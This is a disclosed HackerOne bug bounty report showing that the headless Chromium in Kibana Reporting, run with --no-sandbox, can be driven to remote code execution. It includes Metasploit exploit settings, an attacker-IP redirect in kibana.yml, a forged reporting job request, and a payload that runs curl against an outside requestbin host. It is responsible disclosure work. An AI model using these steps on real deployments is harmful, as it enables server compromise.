---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/privilege-escalation
  - env/web
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2021-05-26
submitted: 2021-04-19T16:26:55.228Z
bounty_usd: 10000
votes: 25
cve: []
program: "[[programs/elastic|Elastic]]"
reporter: "alexbrasetvik"
source: "https://hackerone.com/reports/1168765"
title: "RCE hazard in reporting (via Chromium)"
---
# RCE hazard in reporting (via Chromium)

> **Severity:** Critical | **Bounty:** 10,000 USD | **Votes:** 25 | **Program:** Elastic | **Disclosed:** 2021-05-26

- Report: [https://hackerone.com/reports/1168765](https://hackerone.com/reports/1168765)
- CWE: Privilege Escalation
- Submitted: 2021-04-19T16:26:55.228Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** Reporting embeds a Chromium that is susceptible to RCEs

**Description:**

Reporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with `--no-sandbox` to work at all.

There are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.

Attached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53

I have not been able to devise a complete chain yet (thus the "hazard"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.

## Steps To Reproduce:

  1. Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html
  1. Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)

Here's an example. The attached HTML file gets `uname -a > /tmp/alexb-says-hi` to be run:

```
$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  
bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
bash-4.4$ ls /tmp/
ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
^C # CTRL-C after a few seconds. Reporting would kill it after a timeout
bash-4.4$ ls /tmp/
alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ cat /tmp/alexb-says-hi
Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

## Supporting Material/References:

  * HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)

## Impact

Kibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.

## Timeline

- **Report Filed**
- **2021-04-19** @alexbrasetvik: I didn't click any of the "Severity (Optional)" things, intending to leave them unchecked. I missed the default being High, which it probably isn't without a first step to form a chain.

As I mention, this isn't a complete chain. If mixed with an HTML-injection (even without an XSS) or an open redirect (or a full-blown XSS), it'd be an RCE on Cloud and Kibana, though.
- **2021-04-20** @alexbrasetvik: So I managed to do an RCE on Elastic Cloud. Attached is a video demonstrating it, and the HTML payload used in the video, which triggers `curl -k https://enu8lspgwcj2k.x.pipedream.net/?hifromelasticcloud`

To access the viewer of the requestbin (because editing the payload is a bit onerous), you can access it via https://requestbin.com/r/enu8lspgwcj2k/1rRl9tN9tAMRN6muMXXQB4jjxdZ (I don't know how long that is valid for)

To point reporting's vulnerable chromium at a page that triggered the exploiting Javascript, I, uh, configured kibana.yml to just always respond with a Location header. Then, I pointed reporting at a `/goto` URL, which emits the right redirect header and status code, but with my custom redirect overriding whatever the goto was trying to send the user to. This gets me a vulnerable Chromium to run my payload, which in turn triggers the curl request shown in the video.

The kibana involved is https://0e193a35efd34736940bc3e00386aed8.us-west1.gcp.cloud.es.io:9243, and I'm sure you have execve logs that can confirm these curls :)
- **2021-04-20** @douglas_day: Nice Alex!

I'll start looking into this - though as a heads up, I am out tomorrow and so may not get this triaged and get your money to you until Thursday.

Looking forward to reading into this :)
- **Report Needs More Info**
- **Report New**
- **2021-04-21** @alexbrasetvik: I made an updated recording that's maybe a bit easier to follow. I just spun up an ec2 instance and ran metasploit on it, and got a meterpreter session established in the Kibana container.

Metasploit settings:
```
use exploit/multi/browser/chrome_simplifiedlowering_overflow
set target 0
set payload 5
set uripath /
set lhost [your public ip]
```

Custom kibana.yml settings:
```
server.customResponseHeaders:
   Location: "http://13.53.201.208:8080"
```

Custom reporting create request:

```
# To get a valid auth header, just create a PDF of something and extract its header from here.
# The header is valid for a few minutes, if you get "security exception" from reporting, then 
# you need to refresh your header
GET /.reporting-2021-*/_search?sort=created_at:desc&size=1

POST /.reporting-2021-04-18/_doc
{
          "jobtype" : "printable_pdf",
          "created_at" : "2021-04-19T21:45:15.379Z",
          "created_by" : "2",
          "payload" : {
            "headers" : "REPLACE ME - SEE COMMENT ABOVE",
            "browserTimezone" : "Europe/Oslo",
            "forceNow" : "2021-04-19T21:45:15.379Z",
            "layout" : {
              "dimensions" : {
                "height" : 1160,
                "width" : 1780
              },
              "id" : "preserve_layout"
            },
            "objects" : [
              {
                "relativeUrl" : "/goto/[MAKE A PROPER SHORT URL AND REPLACE ME]#/edit/windows-4bedf650-9ffd-11ea-87e4-49f31ec44891?_g=(filters:!(),refreshInterval:(pause:!t,value:0),time:(from:now-15m,to:now))&_a=(filters:!(('$state':(store:appState),meta:(alias:!n,disabled:!f,index:'logs-*',key:event.code,negate:!f,params:(query:'4625'),type:phrase),query:(match_phrase:(event.code:'4625'))),('$state':(store:appState),meta:(alias:!n,disabled:!f,index:'logs-*',key:winlog.provider_name,negate:!f,params:(query:Microsoft-Windows-Security-Auditing),type:phrase),query:(match_phrase:(winlog.provider_name:Microsoft-Windows-Security-Auditing)))),linked:!f,query:(language:kuery,query:'data_stream.dataset:windows.security%20OR%20data_stream.dataset:system.security'),uiState:(),vis:(aggs:!((enabled:!t,id:'1',params:(customLabel:'Failed%20Logons'),schema:metric,type:count)),params:(addLegend:!f,addTooltip:!t,metric:(colorSchema:'Green%20to%20Red',colorsRange:!((from:0,to:10000)),invertColors:!f,labels:(show:!t),metricColorMode:None,percentageMode:!f,style:(bgColor:!f,bgFill:%23000,fontSize:60,labelColor:!f,subText:''),useRanges:!f),type:metric),title:'%20Failed%20Logons%20%20%5BWindows%20System%20Security%5D',type:metric))"
              }
            ],
            "title" : "goto?",
            "objectType" : "visualization"
          },
          "meta" : {
            "objectType" : "visualization",
            "layout" : "preserve_layout"
          },
          "timeout" : 100000,
          "max_attempts" : 3,
          "priority" : 10,
          "browser_type" : "chromium",
          "status" : "pending",
          "attempts" : 0,
          "process_expiration" : "1970-01-01T00:00:00.000Z"
        }
```
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2021-04-22** @alexbrasetvik: Nice! Thanks! :)
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Changed Scope**
